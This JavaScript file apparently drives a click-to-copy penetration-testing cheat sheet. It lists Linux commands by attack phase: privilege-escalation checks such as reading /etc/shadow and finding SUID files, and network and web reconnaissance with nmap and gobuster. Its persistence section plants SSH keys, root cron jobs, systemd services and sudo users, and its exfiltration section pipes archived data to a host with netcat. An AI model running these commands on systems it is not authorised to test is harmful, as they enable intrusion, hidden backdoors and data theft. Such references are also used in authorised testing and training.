const commandData = {
    privesc: {
        "System Information": [
            "cat /etc/issue",
            "cat /etc/*-release",
            "cat /etc/lsb-release",
            "cat /etc/redhat-release",
            "cat /proc/version",
            "uname -a",
            "uname -mrs",
            "rpm -q kernel",
            "dmesg | grep Linux",
            "ls /boot | grep vmlinuz-",
            "cat /proc/cpuinfo",
            "cat /proc/meminfo",
            "df -h",
            "mount",
            "free -h"
        ],
        "User & Group Information": [
            "cat /etc/passwd",
            "cat /etc/group",
            "cat /etc/shadow",
            "ls -alh /var/mail/",
            "ls -ahlR /root/",
            "ls -la /home/*/.ssh/",
            "cat /home/*/.ssh/authorized_keys",
            "getent passwd",
            "getent group",
            "id",
            "w",
            "last",
            "lastlog",
            "who -a",
            "finger"
        ],
        "Sudo Access": [
            "sudo -l",
            "sudo -V",
            "cat /etc/sudoers",
            "pwck -r",
            "grpck -r",
            "visudo -c",
            "sudo -n -l",
            "sudo -l -U username",
            "cat /var/log/auth.log | grep sudo",
            "cat /etc/sudoers.d/*"
        ],
        "SUID Files": [
            "find / -perm -u=s -type f 2>/dev/null",
            "find / -perm -4000 -type f 2>/dev/null",
            "find / -user root -perm -4000 -print 2>/dev/null",
            "find / -perm -2000 -type f 2>/dev/null",
            "find / -type f -perm -04000 -ls 2>/dev/null",
            "find / -type f -perm -02000 -ls 2>/dev/null",
            "find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2>/dev/null"
        ],
        "Scheduled Tasks": [
            "crontab -l",
            "ls -la /etc/cron*",
            "cat /etc/crontab",
            "cat /var/spool/cron/crontabs/*",
            "systemctl list-timers",
            "ls -alh /var/spool/anacron",
            "ls -al /etc/cron.*/",
            "cat /etc/anacrontab"
        ]
    },
    enum: {
        "User Enumeration": [
            "id",
            "who",
            "w",
            "last",
            "cat /etc/passwd | cut -d: -f1",
            "grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0 { print $1}'",
            "awk -F: '($3 == \"0\") {print}' /etc/passwd",
            "getent passwd | cut -d: -f1",
            "compgen -u",
            "cut -d: -f1 /etc/passwd | sort",
            "for u in $(cut -d: -f1 /etc/passwd); do groups $u; done",
            "for u in $(cut -d: -f1 /etc/passwd); do id $u; done"
        ],
        "Network Information": [
            "hostname -I",
            "ip addr show",
            "ip route",
            "arp -a",
            "netstat -antup",
            "netstat -antpx",
            "netstat -tulpn",
            "ss -tulpn",
            "lsof -i",
            "cat /etc/hosts",
            "cat /etc/resolv.conf",
            "cat /etc/networks",
            "iptables -L",
            "route -n",
            "ip neigh"
        ],
        "Running Services": [
            "ps aux",
            "ps -ef",
            "top -n 1",
            "cat /etc/services",
            "systemctl list-units --type=service",
            "service --status-all",
            "systemctl list-units --type=service --state=running",
            "initctl list",
            "pstree",
            "lsof -i TCP -n -P",
            "netstat -tulpn | grep LISTEN",
            "rpcinfo -p"
        ],
        "Software Versions": [
            "dpkg -l",
            "rpm -qa",
            "apt list --installed",
            "yum list installed",
            "pacman -Q",
            "pkg_info",
            "brew list"
        ]
    },
    recon: {
        "Network Discovery": [
            "nmap -sn 192.168.1.0/24",
            "nmap -sV -A target",
            "netdiscover -r 192.168.1.0/24",
            "ping -c 4 target",
            "arping -c 4 target",
            "fping -a -g 192.168.1.0/24",
            "masscan --rate=1000 -p80 192.168.1.0/24",
            "nbtscan 192.168.1.0/24",
            "arp-scan --localnet"
        ],
        "Port Scanning": [
            "nmap -p- target",
            "nmap -sU -p- target",
            "masscan -p1-65535 target --rate=1000",
            "nc -nvz target 1-1000",
            "nmap -sS -p- target",
            "nmap -sT -p- target",
            "nmap -sV --version-intensity 5 target",
            "unicornscan -mT target",
            "amap -bq target portlist"
        ],
        "Web Enumeration": [
            "dirb http://target",
            "gobuster dir -u http://target -w wordlist.txt",
            "nikto -h http://target",
            "whatweb http://target",
            "wfuzz -c -w wordlist.txt http://target/FUZZ",
            "ffuf -w wordlist.txt -u http://target/FUZZ",
            "dirsearch -u http://target",
            "amass enum -d domain.com",
            "sublist3r -d domain.com"
        ],
        "Service Enumeration": [
            "nmap -sV --script=banner target",
            "nmap -p- -sV --script=version target",
            "amap -bq target portlist",
            "enum4linux target",
            "snmpwalk -c public -v1 target",
            "onesixtyone target public",
            "smbclient -L //target",
            "rpcclient -U \"\" target"
        ]
    },
    persist: {
        "SSH Keys": [
            "ssh-keygen -t rsa",
            "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
            "chmod 700 ~/.ssh",
            "chmod 600 ~/.ssh/authorized_keys",
            "ssh-copy-id user@target",
            "cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys",
            "echo 'command=\"/bin/bash\" ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
            "ssh-keygen -t ed25519"
        ],
        "Cron Jobs": [
            "crontab -e",
            "echo '* * * * * /path/to/script' >> /var/spool/cron/crontabs/root",
            "cat /etc/crontab",
            "echo '@reboot /path/to/script' >> /var/spool/cron/crontabs/root",
            "echo '*/5 * * * * /path/to/script' > /etc/cron.d/persistence",
            "mkdir -p /etc/cron.daily; cp script /etc/cron.daily/",
            "echo '0 0 * * * /path/to/script' >> /etc/crontab"
        ],
        "Service Creation": [
            "systemctl enable myservice",
            "update-rc.d myservice defaults",
            "chkconfig myservice on",
            "echo '[Unit]\nDescription=My Service\n[Service]\nExecStart=/path/to/script\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/myservice.service",
            "systemctl daemon-reload && systemctl enable myservice",
            "ln -s /path/to/script /etc/init.d/myservice",
            "service myservice start"
        ],
        "User Creation": [
            "useradd -m -s /bin/bash username",
            "usermod -aG sudo username",
            "echo 'username:password' | chpasswd",
            "adduser username sudo",
            "passwd username"
        ]
    },
    exfil: {
        "File Transfer": [
            "nc -lvp PORT < file_to_send",
            "nc TARGET PORT > received_file",
            "python3 -m http.server 8000",
            "wget http://TARGET:8000/file",
            "scp file user@target:/path/",
            "rsync -avz file user@target:/path/",
            "curl -O http://target/file",
            "base64 file | tr -d '\\n' | xclip -sel clip"
        ],
        "Data Compression": [
            "tar czf - /path/to/data | nc TARGET PORT",
            "zip -r data.zip /path/to/data",
            "tar czf - /path/to/data | base64",
            "gzip -c file > file.gz",
            "7z a archive.7z /path/to/data",
            "tar cjf - /path/to/data | split -b 1M -",
            "zip -r -e encrypted.zip /path/to/data"
        ],
        "Encryption": [
            "gpg -c file",
            "openssl enc -aes-256-cbc -in file -out file.enc",
            "ccrypt file",
            "gpg --symmetric --cipher-algo AES256 file",
            "openssl enc -e -aes-256-cbc -in file -out file.enc -k password",
            "age -e -p file > file.age",
            "gpg --encrypt --recipient user@example.com file"
        ],
        "Network Transfer": [
            "tcpdump -w capture.pcap",
            "tshark -w capture.pcap",
            "socat - TCP4:target:port",
            "ncat -lvp port --send-only < file",
            "ssh user@target 'cat > file' < localfile"
        ]
    },
    post: {
        "System Information": [
            "uname -a",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /etc/group",
            "cat /etc/issue",
            "lsb_release -a",
            "hostnamectl",
            "cat /proc/version",
            "cat /etc/*-release",
            "dmidecode -t system"
        ],
        "Network Information": [
            "ifconfig",
            "route",
            "netstat -antup",
            "iptables -L",
            "ss -tuln",
            "lsof -i",
            "cat /etc/hosts",
            "cat /etc/resolv.conf",
            "traceroute target",
            "mtr target"
        ],
        "File System": [
            "ls -la /etc/cron*",
            "ls -la /etc/init.d/",
            "find / -perm -4000 2>/dev/null",
            "find / -name '*.bak' 2>/dev/null",
            "find / -type f -mtime -1",
            "lsattr -a /etc/",
            "cat /etc/fstab",
            "df -h"
        ],
        "Process Information": [
            "ps auxf",
            "pstree -a",
            "lsof",
            "top -n 1",
            "htop -n 1",
            "strace -p PID",
            "ltrace -p PID"
        ]
    },
    recent: {
        "Modified Files": [
            "find / -type f -mtime -1",
            "find / -type f -mmin -60",
            "find / -mtime 0",
            "find / -type f -newermt '2023-01-01'",
            "find / -type f -mtime -7",
            "find /etc -type f -mmin -60",
            "find /home -type f -mtime -1"
        ],
        "Access History": [
            "last",
            "lastlog",
            "find / -type f -atime -1",
            "who /var/log/wtmp",
            "aureport --tty",
            "grep -a -B 50 -A 50 'string' /var/log/auth.log",
            "cat ~/.bash_history"
        ],
        "Log Files": [
            "tail -f /var/log/auth.log",
            "tail -f /var/log/syslog",
            "journalctl -xe",
            "cat /var/log/apache2/access.log",
            "cat /var/log/nginx/access.log",
            "cat /var/log/mysql/error.log",
            "cat /var/log/fail2ban.log",
            "dmesg | tail",
            "grep 'Failed password' /var/log/auth.log"
        ],
        "System Changes": [
            "cat /var/log/dpkg.log",
            "cat /var/log/yum.log",
            "cat /var/log/apt/history.log",
            "cat /root/.bash_history",
            "find /etc -type f -mtime -1",
            "ausearch -ts today",
            "cat /var/log/audit/audit.log"
        ]
    }
};

// Function to populate command containers with sections
function populateCommands() {
    Object.keys(commandData).forEach(category => {
        const container = document.querySelector(`#${category} .cmd-container`);
        if (!container) return;

        // Clear existing content
        container.innerHTML = '';

        // Add each section
        Object.entries(commandData[category]).forEach(([sectionName, commands]) => {
            // Create section header
            const sectionHeader = document.createElement('div');
            sectionHeader.className = 'section-header';
            sectionHeader.style.width = '100%';
            sectionHeader.style.borderBottom = '1px solid #444';
            sectionHeader.style.marginTop = '20px';
            sectionHeader.style.marginBottom = '10px';
            sectionHeader.style.paddingBottom = '5px';
            sectionHeader.style.color = '#00aaff';
            sectionHeader.textContent = sectionName;
            container.appendChild(sectionHeader);

            // Create commands for this section
            commands.forEach(cmd => {
                const div = document.createElement('div');
                div.className = 'cmd';
                div.onclick = function() { copy(this); };
                div.textContent = cmd;
                container.appendChild(div);
            });
        });
    });
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', populateCommands);

// Copy function
function copy(element) {
    const text = element.textContent;
    navigator.clipboard.writeText(text)
        .then(() => {
            element.style.backgroundColor = '#556B2F';
            setTimeout(() => {
                element.style.backgroundColor = '';
            }, 300);
        })
        .catch(err => {
            console.error('Failed to copy:', err);
        });
}
